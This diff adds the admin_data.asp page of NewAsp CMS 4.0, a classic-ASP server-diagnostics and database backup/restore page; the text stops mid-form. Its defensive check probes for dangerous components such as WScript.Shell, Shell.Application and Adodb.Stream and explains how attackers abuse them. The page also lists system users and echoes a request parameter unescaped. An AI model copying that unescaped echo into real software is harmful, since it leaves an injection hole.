@@ -1,0 +1,1319 @@
+<!--#include file="const.asp"-->
+<%
+Server.ScriptTimeOut = 99999
+Admin_header
+On Error Resume Next
+'=====================================================================
+' 软件名称：新云网站管理系统
+' 当前版本：NewAsp Content Management System Version 4.0
+' 文件名称：admin_data.asp
+' 更新日期：2008-05-16
+' 官方网站：新云网络(www.newasp.net www.newasp.cn) QQ：94022511
+'=====================================================================
+' Copyright 2003-2008 newasp.net - All Rights Reserved.
+' newasp is a trademark of newasp.net
+'=====================================================================
+%>
+<table class="table1" cellspacing="1" cellpadding="3" align="center" border="0">
+	<tr>
+		<td class="tableline linetitle" width="180" align="left">服务器信息数据处理</td>
+		<td class="tableline" width="*" align="right"><a href="admin_data.asp?action=detect">服务器信息</a>
+			 - <a href="?action=Test">安全检测</a>
+			 - <a href="?action=CompressData">压缩数据库</a>
+			 - <a href="?action=BackupData">备份数据库</a>
+			 - <a href="?action=RestoreData">恢复数据库</a>
+			 - <a href="?action=Readme">SQL操作说明</a>
+			 - <a href="admin_replace.asp">数据批量替换</a>
+		</td>
+	</tr>
+</table>
+<%
+Const IsDiskInfo = True		'--是否显示磁盘信息
+Const IsSafeTest = True		'--是否显示不安全组件检测
+Const IsUserInfo = True		'--是否显示系统用户和进程检测
+
+Dim okOS,okCpus,okCPU,okIIS,okExpires
+Dim bkfolder, bkdbname
+Dim Action, mdbPath,FSOClassID
+FSOClassID = Trim(NewAsp.MainSetting(47))'"Scripting.FileSystemObject"
+mdbPath = Replace(MyAppPath&Ask_db, "//", "/")
+If Not ChkAdmin("999") Then
+	Call Transfer_error()
+End If
+Action = NewAsp.CheckStr(Request("action"))
+Select Case Trim(Action)
+	Case "browse"
+		Call browseBackupFolder()
+	Case "del"
+		Call deleteBackupFile()
+	Case "Test"
+		If IsDiskInfo Then TestDisklist()
+		If IsSafeTest Then TestUnsafe()
+		If IsUserInfo Then TestSysUserlist()
+	Case "Readme"
+		Call SQLUserReadme()
+	Case "CompressData"	'--压缩数据库
+		If Request("act") = "Compress" Then
+			If AskIsSqlDataBase = 1 Then
+				Call CompressSQLDatabase()
+			Else
+				Call CompressDatabase()
+			End If
+		Else
+			Call CompressData()
+		End If
+	Case "BackupData"	'--备份数据库
+		If Request("act") = "Backup" Then
+			If AskIsSqlDataBase = 1 Then
+				Call BackupSqlDatabase()
+			Else
+				Call BackupDatabase()
+			End If
+		Else
+			Call BackupData()
+		End If
+	Case "RestoreData"	'--恢复数据库
+		Call selectBrowseJS()
+		If Request("act") = "Restore" Then
+			If AskIsSqlDataBase = 1 Then
+				Call RestoreSqlDatabase()
+			Else
+				Call RestoreDatabase()
+			End If
+			Application.Contents.RemoveAll
+		Else
+			Call RestoreData()
+		End If
+	Case Else
+		Call showmain
+End Select
+If FoundErr = True Then
+	ReturnError(ErrMsg)
+End If
+Admin_footer
+SaveLogInfo(AdminName)
+NewAsp.PageEnd
+
+Sub GetSQLVersion()
+	On Error Resume Next
+
+	Dim Rs
+	Set Rs = NewAsp.Ask_Execute("SELECT @@version ")
+	If Err=0 Then
+		Response.Write "<span title="""&Rs(0)&""">"
+		Response.Write Replace(Split(Rs(0), "-")(0), "Microsoft ", "")
+	End If
+	Set Rs = Nothing
+	Set Rs = NewAsp.Ask_Execute("SELECT SERVERPROPERTY ('productlevel')")
+	If Err Then
+		Response.Write "Microsoft SQL Server "
+	Else
+		Response.Write Rs(0) & "</span>"
+	End If
+	Set Rs = Nothing
+End Sub
+
+Sub showmain()
+	Call GetSysInfo()
+	Dim FoundFso
+	FoundFso = False
+	FoundFso = InstallObjTest(FSOClassID,"")
+%>
+<table border="0" align="center" cellpadding="3" cellspacing="1" class="tableborder">
+<tr>
+	<th colspan="5">服务器系统信息检测情况</th>
+</tr>
+<tr>
+	<td class="tablerow1" width="25%">当前程序版本</td>
+	<td class="tablerow1" width="25%">NewAspCMS <%=cmsversion%></td>
+	<td class="tablerow1" width="1%">&nbsp;</td>
+	<td class="tablerow1" width="24%">数据库类型</td>
+	<td class="tablerow1" width="25%"><%If AskIsSqlDataBase = 1 Then
+		Call GetSQLVersion()
+	Else
+		Response.Write "Microsoft Access"
+	End If%></td>
+</tr>
+<tr>
+	<td class="tablerow2">当前服务器名</td>
+	<td class="tablerow2"><%=Request.ServerVariables("SERVER_NAME")%></td>
+	<td class="tablerow2">&nbsp;</td>
+	<td class="tablerow2">数据库空间使用</td>
+	<td class="tablerow2">
+<%
+If AskIsSqlDataBase = 1 Then
+	Dim oRs
+	Set oRs=NewAsp.Ask_Execute("Exec sp_spaceused")
+	If Err <> 0 Then
+		Err.Clear
+		Response.Write "<font color=""gray"">未知</font>"
+	Else
+		Response.Write oRs(1)
+	End If
+	Set oRs=Nothing
+Else
+	If FoundFso Then
+		Response.Write GetFileSize(MyAppPath & db)
+	Else
+		Response.Write "<font color=""gray"">未知</font>"
+	End If
+End If
+%>
+	</td>
+</tr>
+<tr>
+	<td class="tablerow1" colspan="5"><b>服务器相关信息</b></td>
+</tr>
+<tr>
+	<td class="tablerow2">当前IIS 版本</td>
+	<td class="tablerow2"><%=Request.ServerVariables("SERVER_SOFTWARE")%></td>
+	<td class="tablerow2">&nbsp;</td>
+	<td class="tablerow2">服务器IP地址</td>
+	<td class="tablerow2"><%=Request.ServerVariables("LOCAL_ADDR")%></td>
+</tr>
+<tr>
+	<td class="tablerow1">服务器操作系统</td>
+	<td class="tablerow1"><%=okOS%></td>
+	<td class="tablerow1">&nbsp;</td>
+	<td class="tablerow1">服务器CPU数量</td>
+	<td class="tablerow1"><%=okCPUS%> 个</td>
+</tr>
+<tr>
+	<td class="tablerow2">脚本解释引擎</td>
+	<td class="tablerow2"><%=ScriptEngine & "/"& ScriptEngineMajorVersion &"."&ScriptEngineMinorVersion&"."& ScriptEngineBuildVersion %><br/><%="JScript/" & getjver()%></td>
+	<td class="tablerow2">&nbsp;</td>
+	<td class="tablerow2">全局和会话变量</td>
+	<td class="tablerow2">Application 变量 <%=Application.Contents.count%> 个<br/>Session 变量 <%=Session.Contents.count%> 个</td>
+</tr>
+<tr>
+	<td class="tablerow1">服务器时间</td>
+	<td class="tablerow1"><%=Now()%></td>
+	<td class="tablerow1">&nbsp;</td>
+	<td class="tablerow1">服务器端口</td>
+	<td class="tablerow1"><%=Request.ServerVariables("SERVER_PORT")%></td>
+</tr>
+<tr>
+	<td class="tablerow2">站点物理路径</td>
+	<td class="tablerow2" colspan="4"><%=Request.ServerVariables("APPL_PHYSICAL_PATH")%></td>
+</tr>
+<tr>
+	<td class="tablerow1" colspan="5"><b>服务器主要组件支持</b></td>
+</tr>
+<tr>
+	<td class="tablerow2">FSO文件读写</td>
+	<td class="tablerow2"><%=CheckObjTest(FSOClassID)%></td>
+	<td class="tablerow2">&nbsp;</td>
+	<td class="tablerow2">ADO 数据库访问对象</td>
+	<td class="tablerow2"><%=CheckObjTest("adodb.connection")%></td>
+</tr>
+<tr>
+	<td class="tablerow1">无组件上传支持</td>
+	<td class="tablerow1"><%=CheckObjTest("Adodb.Stream")%></td>
+	<td class="tablerow1">&nbsp;</td>
+	<td class="tablerow1">HTTP 组件(用于采集)</td>
+	<td class="tablerow1"><%=CheckObjTest("Microsoft.XMLHTTP")%></td>
+</tr>
+<tr>
+	<td class="tablerow2">Shell 组件(涉及安全问题)</td>
+	<td class="tablerow2"><%=CheckObjTest("WScript.Shell")%></td>
+	<td class="tablerow2">&nbsp;</td>
+	<td class="tablerow2">新云WEB采集组件</td>
+	<td class="tablerow2"><%=CheckObjTest("NewAspGatherer.VBProcess")%></td>
+</tr>
+<tr>
+	<td class="tablerow1" colspan="5"><b>服务器常用组件支持</b></td>
+</tr>
+<tr>
+	<td class="tablerow2">Jmail发送邮件支持</td>
+	<td class="tablerow2"><%=CheckObjTest("JMail.SmtpMail")%></td>
+	<td class="tablerow2">&nbsp;</td>
+	<td class="tablerow2">CDONTS发送邮件支持</td>
+	<td class="tablerow2"><%=CheckObjTest("CDONTS.NewMail")%></td>
+</tr>
+<tr>
+	<td class="tablerow1">AspEmail发送邮件支持</td>
+	<td class="tablerow1"><%=CheckObjTest("Persits.MailSender")%></td>
+	<td class="tablerow1">&nbsp;</td>
+	<td class="tablerow1">CDOSYS发送邮件支持</td>
+	<td class="tablerow1"><%=CheckObjTest("CDO.Message")%></td>
+</tr>
+<tr>
+	<td class="tablerow2">AspUpload上传支持</td>
+	<td class="tablerow2"><%=CheckObjTest("Persits.Upload")%></td>
+	<td class="tablerow2">&nbsp;</td>
+	<td class="tablerow2">SA-FileUp上传支持</td>
+	<td class="tablerow2"><%=CheckObjTest("SoftArtisans.FileUp")%></td>
+</tr>
+<tr>
+	<td class="tablerow1">刘云峰的文件上传组件</td>
+	<td class="tablerow1"><%=CheckObjTest("LyfUpload.UploadFile")%></td>
+	<td class="tablerow1">&nbsp;</td>
+	<td class="tablerow1">SoftArtisans 文件管理</td>
+	<td class="tablerow1"><%=CheckObjTest("SoftArtisans.FileManager")%></td>
+</tr>
+<tr>
+	<td class="tablerow2">CreatePreviewImage生成预览图片</td>
+	<td class="tablerow2"><%=CheckObjTest("CreatePreviewImage.cGvbox")%></td>
+	<td class="tablerow2">&nbsp;</td>
+	<td class="tablerow2">AspJpeg生成预览图片</td>
+	<td class="tablerow2"><%=CheckObjTest("Persits.Jpeg")%></td>
+</tr>
+<tr>
+	<td class="tablerow1">SA-ImgWriter生成预览图片</td>
+	<td class="tablerow1"><%=CheckObjTest("SoftArtisans.ImageGen")%></td>
+	<td class="tablerow1">&nbsp;</td>
+	<td class="tablerow1">Dimac 的图像读写组件</td>
+	<td class="tablerow1"><%=CheckObjTest("W3Image.Image")%></td>
+</tr>
+<tr>
+	<td class="tablerow2">呆呆IIS管理组件</td>
+	<td class="tablerow2"><%=CheckObjTest("hin2.com_iis")%></td>
+	<td class="tablerow2">&nbsp;</td>
+	<td class="tablerow2">Dimac公司的Socket组件</td>
+	<td class="tablerow2"><%=CheckObjTest("Socket.TCP")%></td>
+</tr>
+<tr>
+	<td class="tablerow1" colspan="5"><b>其它组件支持情况查询</b></td>
+</tr>
+<form action="admin_data.asp" method="post" id="form1" name="form1">
+<tr>
+	<td class="tablerow2" colspan="5"><%
+	Dim okVersion
+	If Trim(Request("classname"))<>"" Then
+		If InstallObjTest(Trim(Request("classname")),okVersion) Then
+			Response.Write "<font color=""blue""><b>恭喜，本服务器支持 "&Request("classname")&" 组件 "
+			If okVersion<>"" Then
+				Response.Write "版本："
+				Response.Write okVersion
+			End If
+			Response.Write "</b></font><br/>"
+		Else
+			Response.Write "<font color=""red""><b>抱歉，本服务器不支持 "&Request("classname")&" 组件</b></font><br/>"
+		End If
+	End If
+	%>
+	<input type=text value="" name="classname" size="35">
+	<input type="submit" class="button" value="查 询" id="submit_button" name="submit_button">
+	请在输入框中输入组件的ProgId或ClassId
+	</td>
+</tr>
+</form>
+<tr>
+	<td class="tablerow1" colspan="5"><b>磁盘文件操作速度测试</b></td>
+</tr>
+<tr>
+	<td class="tablerow2" colspan="5">
+<%
+	Response.Write "正在重复创建、写入和删除文本文件50次..."
+
+	Dim thetime3,tempfile,iserr,t1,FsoObj,tempfileOBJ,t2,i
+	Set FsoObj=NewAsp.CreateAXObject(FSOClassID)
+
+	iserr=False
+	t1=timer
+	tempfile=Server.MapPath("./") & "\aspchecktest.txt"
+	For i=1 To 50
+		Err.Clear
+
+		Set tempfileOBJ = FsoObj.CreateTextFile(tempfile,true)
+		If Err <> 0 Then
+			Response.Write "创建文件错误！"
+			iserr=True
+			Err.Clear
+			Exit For
+		End If
+		tempfileOBJ.WriteLine "Only for test. Ajiang ASPcheck"
+		If Err <> 0 Then
+			Response.Write "写入文件错误！"
+			iserr=True
+			Err.Clear
+			Exit For
+		End If
+		tempfileOBJ.close
+		Set tempfileOBJ = FsoObj.GetFile(tempfile)
+		tempfileOBJ.Delete
+		If Err <> 0 Then
+			Response.Write "删除文件错误！"
+			iserr=True
+			Err.Clear
+			Exit For
+		End If
+		Set tempfileOBJ=Nothing
+	Next
+	Set FsoObj=Nothing
+	t2=timer
+	If Not iserr Then
+		thetime3=cstr(int(( (t2-t1)*10000 )+0.5)/10)
+		Response.Write "...已完成！本服务器执行此操作共耗时 <font color=""red"">" & thetime3 & " 毫秒</font>"
+	End If
+	Response.Flush
+%>
+	<br/><a href="http://www.newasp.net" target="_blank">新云服务器 <font color="gray">四至强2.13GHz,2GddrEcc</font> 执行此操作需要 <font color="red">23～57</font> 毫秒</a>
+	</td>
+</tr>
+<tr>
+	<td class="tablerow1" colspan="5"><b>ASP脚本解释和运算速度测试</b></td>
+</tr>
+<tr>
+	<td class="tablerow2" colspan="5">
+<%
+
+	Response.Write "整数运算测试，正在进行50万次加法运算..."
+	dim lsabc,thetime,thetime2
+	t1=timer
+	For i=1 To 500000
+		lsabc= 1 + 1
+	Next
+	t2=timer
+	thetime=cstr(int(( (t2-t1)*10000 )+0.5)/10)
+	Response.Write "...已完成！共耗时 <font color=red>" & thetime & " 毫秒</font><br/>"
+
+
+	Response.Write "浮点运算测试，正在进行20万次开方运算..."
+	t1=timer
+	For i=1 To 200000
+		lsabc= 2^0.5
+	Next
+	t2=timer
+	thetime2=cstr(int(( (t2-t1)*10000 )+0.5)/10)
+	Response.Write "...已完成！共耗时 <font color=red>" & thetime2 & " 毫秒</font><br/>"
+%>
+	<br/><a href="http://www.newasp.net" target="_blank">新云服务器 <font color="gray">四至强2.13GHz,2GddrEcc</font> 整数运算需要 <font color="red">109～117</font> 毫秒, 浮点运算需要 <font color="red">85～101</font> 毫秒</a>
+	</td>
+</tr>
+</table>
+<%
+	Response.Flush
+End Sub
+'--服务器磁盘信息
+Sub TestDisklist()
+	On Error Resume Next
+	If InstallObjTest(FSOClassID,"") Then
+		Dim fso,drv,d,iCount,DriveIsReady,i
+		Set fso=NewAsp.CreateAXObject(FSOClassID)
+		i = 0
+%>
+<table border="0"  cellspacing="1" cellpadding="3" align="center" class="tableborder">
+<tr>
+	<th colspan="6">服务器磁盘信息</th>
+</tr>
+<tr align="center">
+	<td class="tablerow1" width="18%"><b>盘符和磁盘类型</b></td>
+	<td class="tablerow1" width="7%"><b>就绪</b></td>
+	<td class="tablerow1" width="20%"><b>卷标</b></td>
+	<td class="tablerow1" width="15%"><b>文件系统</b></td>
+	<td class="tablerow1" width="20%"><b>可用空间</b></td>
+	<td class="tablerow1" width="20%"><b>总空间</b></td>
+</tr><%
+		Set drv=fso.Drives
+		For Each d In drv
+			If (i mod 2) = 0 Then
+				iCount = 2
+			Else
+				iCount = 1
+			End If
+			i = i + 1
+%>
+<tr align="center">
+	<td class="tablerow<%=iCount%>"><%=cDrivetype(d.DriveType) & " " & d.DriveLetter%>:</td><%
+			If d.DriveLetter = "A" Then	'为防止影响服务器，不检查软驱
+				Response.Write "<td class=""tablerow" & iCount & """>&nbsp;</td><td class=""tablerow" & iCount & """>&nbsp;</td><td class=""tablerow" & iCount & """>&nbsp;</td><td class=""tablerow" & iCount & """>&nbsp;</td><td class=""tablerow" & iCount & """>&nbsp;</td>"
+			Else
+				DriveIsReady=d.isReady
+%>
+	<td class="tablerow<%=iCount%>"><%=cIsReady(DriveIsReady)%></td>
+	<td class="tablerow<%=iCount%>"><%If DriveIsReady Then Response.Write cVolumeName(d.VolumeName) Else Response.Write "&nbsp;" %></td>
+	<td class="tablerow<%=iCount%>"><%If DriveIsReady Then Response.Write cFileSystem(d.FileSystem) Else Response.Write "&nbsp;" %></td>
+	<td class="tablerow<%=iCount%>"><%If DriveIsReady Then Response.Write cSize(d.FreeSpace) Else Response.Write "未知"%></td>
+	<td class="tablerow<%=iCount%>"><%If DriveIsReady Then Response.Write cSize(d.TotalSize) Else Response.Write "未知"%></td>
+<%
+			End If
+			Response.Write "</tr>" & vbNewLine
+		Next
+		Set drv=Nothing
+		Set fso=Nothing
+		Response.Write "</table>" & vbNewLine
+	End If
+	Response.Flush
+End Sub
+'--不安全组件检测
+Sub TestUnsafe()
+On Error Resume Next
+%>
+<object runat="server" id="ws" scope="page" classid="clsid:72C24DD5-D70A-438B-8A42-98424B88AFB8"></object>
+<object runat="server" id="net" scope="page" classid="clsid:093FF999-1EA0-4079-9525-9614C3504B74"></object>
+<object runat="server" id="net" scope="page" classid="clsid:F935DC26-1CF0-11D0-ADB9-00C04FD58A0B"></object>
+<object runat="server" id="fso" scope="page" classid="clsid:0D43FE01-F093-11CF-8940-00A0C9054228"></object>
+<object runat="server" id="ado" scope="page" classid="clsid:00000566-0000-0010-8000-00AA006D2EA4"></object>
+<object runat="server" id="app" scope="page" classid="clsid:13709620-C279-11CE-A49E-444553540000"></object>
+<object runat="server" id="hap" scope="page" classid="clsid:06290BD5-48AA-11D2-8432-006008C3FBFC"></object>
+<object runat="server" id="x1" scope="page" classid="clsid:2933BF90-7B36-11d2-B20E-00C04F983E60"></object>
+<object runat="server" id="x2" scope="page" classid="clsid:f5078f1b-c551-11d3-89b9-0000f81fe221"></object>
+<object runat="server" id="x3" scope="page" classid="clsid:f5078f32-c551-11d3-89b9-0000f81fe221"></object>
+<object runat="server" id="x4" scope="page" classid="clsid:88d969c0-f192-11d4-a65f-0040963251e5"></object>
+<object runat="server" id="x5" scope="page" classid="clsid:88D969E5-F192-11D4-A65F-0040963251E5"></object>
+<object runat="server" id="x6" scope="page" classid="clsid:88d96a05-f192-11d4-a65f-0040963251e5"></object>
+<table border="0"  cellspacing="1" cellpadding="3" align="center" class="tableborder">
+<tr>
+	<th colspan="2">不安全组件检测</th>
+</tr>
+<tr>
+	<td class="tablerow1" width="35%">WScript.Shell <%=CheckOkObj("ws")%><br/>Shell.application <%=CheckOkObj("app")%></td>
+	<td class="tablerow1" width="65%">Shell 组件允许ASP运行.exe等可执行文件，存在严重的安全隐患。即使在文件系统进行过严格的权限设置的服务器上，此组件也会被用来运行提升权限的程序。</td>
+</tr>
+<tr>
+	<td class="tablerow2">WScript.Network <%=CheckOkObj("net")%></td>
+	<td class="tablerow2">WScript.Network 为ASP程序罗列和创建系统用户(組)提供了可能，如果上面提示“√ 危险”则可能存在此安全隐患。</td>
+</tr>
+<tr>
+	<td class="tablerow1">Adodb.Stream <%=CheckOkObj("ado")%></td>
+	<td class="tablerow1">Adodb.Stream 常常被用来上传木马等不安全程序，从而扩大攻击者的破坏能力。通过必要的权限设置，Adodb.Stream不会对系统安全造成威胁，它常常被使用在无组件上传工具中。</td>
+</tr>
+<tr>
+	<td class="tablerow2">FSO(Scripting.FileSystemObject) <%=CheckOkObj("fso")%><br/>MsXML1.0 <%=CheckOkObj("x1")%>, 2.6 <%=CheckOkObj("x2")%>, 3.0 <%=CheckOkObj("x3")%><br/>MsXML4.0 <%=CheckOkObj("x4")%>, 5.0 <%=CheckOkObj("x5")%>, 6.0 <%=CheckOkObj("x6")%></td>
+	<td class="tablerow2">FSO(Scripting.FileSystemObject) 和 XML 具备罗列和管理服务器中文件和文件夹的能力，如果权限设置不当，将导致木马程序移动、修改甚至删除服务器上的文件。FSO 组件是常用的组件之一，禁用该组件并不是最理想的安全措施。</td>
+</tr>
+<tr>
+	<td class="tablerow1">HappyTime <%=CheckOkObj("hap")%></td>
+	<td class="tablerow1">HappyTime(欢乐时光)是流行的网络蠕虫病毒之一，它的繁殖占用大量网络带宽，病毒发作时它有可能删除服务器上有用的可执行文件导致系统瘫痪。如果此项检测结果为危险，则您的服务器将存在感染和传播欢乐时光病毒的可能。</td>
+</tr>
+</table>
+<%
+	Response.Flush
+End Sub
+'--系统用户和进程检测
+Sub TestSysUserlist()
+	On Error Resume Next
+	Dim obj,i,iCount
+	i = 0
+%>
+<table border="0"  cellspacing="1" cellpadding="3" align="center" class="tableborder">
+<tr>
+	<th colspan="2">系统用户和进程检测 -- 如果下面列出了系统用户和进程，则说明系统存在安全隐患。</th>
+</tr>
+<tr>
+	<td class="tablerow1" width="20%" align="center"><b>用户(組)/进程类型</b></td>
+	<td class="tablerow1" width="80%"><b>用户(組)/进程详情</b>--隐藏方法：【开始→程序→管理工具→服务】，找到Workstation，停止并禁用。</td>
+</tr><%
+	For Each obj In getObject("WinNT://.")
+		Err.Clear
+		If (i mod 2) = 0 Then
+			iCount = 2
+		Else
+			iCount = 1
+		End If
+		i = i + 1
+%>
+<tr>
+	<td class="tablerow<%=iCount%>" align="center"><!--<%=obj.path%>--><%
+	If Err Then
+		Response.Write "系统用户(組)"
+	Else
+		Response.Write "系统进程"
+	End If
+	%></td>
+	<td class="tablerow<%=iCount%>"><%=obj.Name%><%If Err=0 Then Response.Write " (" & obj.displayname & ")"%><br><%=obj.Path%></td>
+</tr><%
+	Next
+%>
+</table>
+<%
+	Response.Flush
+End Sub
+
+Sub SQLUserReadme()
+%>
+<table border="0"  cellspacing="1" cellpadding="3" align="center" class="tableborder">
+	<tr>
+		<th>SQL数据库数据处理说明</th>
+	</tr>
+	<tr>
+		<td class="tablerow1">
+ 			<blockquote>
+<B>一、备份数据库</B>
+<br/><br/>
+1、打开SQL企业管理器，在控制台根目录中依次点开Microsoft SQL Server<br/>
+2、SQL Server组-->双击打开你的服务器-->双击打开数据库目录<br/>
+3、选择你的数据库名称（如系统数据库Newasp）-->然后点上面菜单中的工具-->选择备份数据库<br/>
+4、备份选项选择完全备份，目的中的备份到如果原来有路径和名称则选中名称点删除，然后点添加，如果原来没有路径和名称则直接选择添加，接着指定路径和文件名，指定后点确定返回备份窗口，接着点确定进行备份
+<br/><br/>
+<B>二、还原数据库</B><br/><br/>
+1、打开SQL企业管理器，在控制台根目录中依次点开Microsoft SQL Server<br/>
+2、SQL Server组-->双击打开你的服务器-->点图标栏的新建数据库图标，新建数据库的名字自行取<br/>
+3、点击新建好的数据库名称（如系统数据库Newasp）-->然后点上面菜单中的工具-->选择恢复数据库<br/>
+4、在弹出来的窗口中的还原选项中选择从设备-->点选择设备-->点添加-->然后选择你的备份文件名-->添加后点确定返回，这时候设备栏应该出现您刚才选择的数据库备份文件名，备份号默认为1（如果您对同一个文件做过多次备份，可以点击备份号旁边的查看内容，在复选框中选择最新的一次备份后点确定）-->然后点击上方常规旁边的选项按钮<br/>
+5、在出现的窗口中选择在现有数据库上强制还原，以及在恢复完成状态中选择使数据库可以继续运行但无法还原其它事务日志的选项。在窗口的中间部位的将数据库文件还原为这里要按照你SQL的安装进行设置（也可以指定自己的目录），逻辑文件名不需要改动，移至物理文件名要根据你所恢复的机器情况做改动，如您的SQL数据库装在D:\Program Files\Microsoft SQL Server\MSSQL\Data，那么就按照您恢复机器的目录进行相关改动改动，并且最后的文件名最好改成您当前的数据库名（如原来是Newasp_data.mdf，现在的数据库是Newasp，就改成Newasp_data.mdf），日志和数据文件都要按照这样的方式做相关的改动（日志的文件名是*_log.ldf结尾的），这里的恢复目录您可以自由设置，前提是该目录必须存在（如您可以指定d:\sqldata\Newasp_data.mdf或者d:\sqldata\Newasp_log.ldf），否则恢复将报错<br/>
+6、修改完成后，点击下面的确定进行恢复，这时会出现一个进度条，提示恢复的进度，恢复完成后系统会自动提示成功，如中间提示报错，请记录下相关的错误内容并询问对SQL操作比较熟悉的人员，一般的错误无非是目录错误或者文件名重复或者文件名错误或者空间不够或者数据库正在使用中的错误，数据库正在使用的错误您可以尝试关闭所有关于SQL窗口然后重新打开进行恢复操作，如果还提示正在使用的错误可以将SQL服务停止然后重起看看，至于上述其它的错误一般都能按照错误内容做相应改动后即可恢复<br/><br/>
+
+<B>三、收缩数据库</B><br/><br/>
+一般情况下，SQL数据库的收缩并不能很大程度上减小数据库大小，其主要作用是收缩日志大小，应当定期进行此操作以免数据库日志过大<br/>
+1、设置数据库模式为简单模式：打开SQL企业管理器，在控制台根目录中依次点开Microsoft SQL Server-->SQL Server组-->双击打开你的服务器-->双击打开数据库目录-->选择你的数据库名称（如系统数据库Newasp）-->然后点击右键选择属性-->选择选项-->在故障还原的模式中选择“简单”，然后按确定保存<br/>
+2、在当前数据库上点右键，看所有任务中的收缩数据库，一般里面的默认设置不用调整，直接点确定<br/>
+3、<font color="blue">收缩数据库完成后，建议将您的数据库属性重新设置为标准模式，操作方法同第一点，因为日志在一些异常情况下往往是恢复数据库的重要依据</font><br/>
+4、用SQL脚本压缩数据库，打开SQL查询分析器，执行下面的脚本即可。<font color="blue">
+<pre style="background:#f7f7fe;border:1px solid #ddd;margin:3px 10px;padding:0 5px;width:300px;">
+BACKUP LOG [<font color="red">您的数据库名</font>] WITH NO_LOG
+BACKUP LOG [<font color="red">您的数据库名</font>] WITH TRUNCATE_ONLY
+DBCC SHRINKDATABASE(N'<font color="red">您的数据库名</font>')
+</pre></font>
+<br/><br/>
+
+<B>四、设定每日自动备份数据库</B><br/><br/>
+<font color="red">强烈建议有条件的用户进行此操作！</font><br/>
+1、打开企业管理器，在控制台根目录中依次点开Microsoft SQL Server-->SQL Server组-->双击打开你的服务器<br/>
+2、然后点上面菜单中的工具-->选择数据库维护计划器<br/>
+3、下一步选择要进行自动备份的数据-->下一步更新数据优化信息，这里一般不用做选择-->下一步检查数据完整性，也一般不选择<br/>
+4、下一步指定数据库维护计划，默认的是1周备份一次，点击更改选择每天备份后点确定<br/>
+5、下一步指定备份的磁盘目录，选择指定目录，如您可以在D盘新建一个目录如：d:\databak，然后在这里选择使用此目录，如果您的数据库比较多最好选择为每个数据库建立子目录，然后选择删除早于多少天前的备份，一般设定4－7天，这看您的具体备份要求，备份文件扩展名一般都是bak就用默认的<br/>
+6、下一步指定事务日志备份计划，看您的需要做选择-->下一步要生成的报表，一般不做选择-->下一步维护计划历史记录，最好用默认的选项-->下一步完成<br/>
+7、完成后系统很可能会提示Sql Server Agent服务未启动，先点确定完成计划设定，然后找到桌面最右边状态栏中的SQL绿色图标，双击点开，在服务中选择Sql Server Agent，然后点击运行箭头，选上下方的当启动OS时自动启动服务<br/>
+8、这个时候数据库计划已经成功的运行了，他将按照您上面的设置进行自动备份
+<br/><br/>
+修改计划：<br/>
+1、打开企业管理器，在控制台根目录中依次点开Microsoft SQL Server-->SQL Server组-->双击打开你的服务器-->管理-->数据库维护计划-->打开后可看到你设定的计划，可以进行修改或者删除操作
+<br/><br/>
+<B>五、数据的转移（新建数据库或转移服务器）</B><br/><br/>
+一般情况下，最好使用备份和还原操作来进行转移数据，在特殊情况下，可以用导入导出的方式进行转移，这里介绍的就是导入导出方式，导入导出方式转移数据一个作用就是可以在收缩数据库无效的情况下用来减小（收缩）数据库的大小，本操作默认为您对SQL的操作有一定的了解，如果对其中的部分操作不理解，可以咨询动网相关人员或者查询网上资料<br/>
+1、将原数据库的所有表、存储过程导出成一个SQL文件，导出的时候注意在选项中选择编写索引脚本和编写主键、外键、默认值和检查约束脚本选项<br/>
+2、新建数据库，对新建数据库执行第一步中所建立的SQL文件<br/>
+3、用SQL的导入导出方式，对新数据库导入原数据库中的所有表内容<br/>
+ 			</blockquote>
+		</td>
+	</tr>
+</table>
+<%
+End Sub
+
+'====================恢复数据库=========================
+
+Sub RestoreData()
+	If AskIsSqlDataBase = 1 Then
+%>
+<table border="0"  cellspacing="1" cellpadding="3" align="center" class="tableborder">
+	<tr>
+		<th>恢复SQL数据</th>
+	</tr>
+	<form name="form1" method="post" action="?action=RestoreData&act=Restore">
+	<tr>
+		<td class="tablerow1">
+			&nbsp;&nbsp;
+			恢复SQL数据库名称：<input type="text" size="35" name="SqlDataName" value="******" disabled><br/>&nbsp;&nbsp;
+			SQL数据库用户名称：<input type="text" size="35" name="SqlUserID" value="******" disabled>&nbsp;请输入您的SQL数据库用户名<br/>&nbsp;&nbsp;
+			SQL数据库用户密码：<input type="Password" size="35" name="SqlUserPass" value="******" disabled>&nbsp;请输入您的SQL数据库连接密码<br/>&nbsp;&nbsp;
+			SQL数据库服务器名：<input type="text" size="35" name="SqlServer" value="(local)" disabled>&nbsp;连接服务器名（本地用local，外地用IP）<br/>&nbsp;&nbsp;
+			备份SQL数据库目录：<input type="text" size="35" name="BackupSqlDir" value="Databackup" disabled>&nbsp;请输入您备份的数据库目录<br/>&nbsp;&nbsp;
+			备份SQL数据库名称：<input type="text" size="35" name="BackupSqlName" id="backpath" value="newasp_<%=RanDataName%>.bak">&nbsp; <input type="button" name="selectbrowse" value=" 浏览... " onclick="selectBrowse()" class="button">&nbsp;&nbsp;请输入您备份的数据库名<br/>
+			&nbsp;&nbsp;<input type="submit" value="恢复数据库" class="button"><br/>
+		</td>
+	</tr>
+	<tr>
+		<td class="tablerow2">
+			&nbsp;&nbsp;您可以用这个功能来恢复您的法规数据，请确定你的数据库用户有相关权限才能恢复！<br/>
+			&nbsp;&nbsp;注意：数据库使用中可能无法恢复，<font color="blue">建议登录服务器使用SQL企业管理器进行恢复。</font><br>
+			&nbsp;&nbsp;<a href="?action=Readme">>>更多SQL数据库数据处理说明</a>
+		</td>
+	</tr>
+	</form>
+</table>
+<%
+	Else
+%>
+<table border="0"  cellspacing="1" cellpadding="3" align="center" class="tableborder">
+	<tr>
+		<th>恢复系统数据 ( 需要FSO支持，FSO相关帮助请看微软网站 )</th>
+	</tr>
+	<form name="form1" method="post" action="?action=RestoreData&act=Restore">
+	<tr>
+		<td class="tablerow1">
+			&nbsp;&nbsp;备份数据库名称：<input type="text" size="65" id="backpath" name="backpath" value="newasp_backup_<%=RanDataName%>.mdb"> <input type="button" name="selectbrowse" value=" 浏览... " onclick="selectBrowse()" class="button">&nbsp;&nbsp;数据库相对于Databackup目录中<br/>
+			&nbsp;&nbsp;目标数据库路径：<input type="text" size="65" name="DBpath" value="<%=mdbPath%>" disabled><br/>&nbsp;&nbsp;填写您当前使用的数据库路径，如不想覆盖当前文件，可自行命名（注意路径是否正确），然后修改conn.asp文件，如果目标文件名和当前使用数据库名一致的话，不需修改conn.asp文件<br/>
+			&nbsp;&nbsp;<input type="submit" value="恢复数据库" class="button"> <br/>
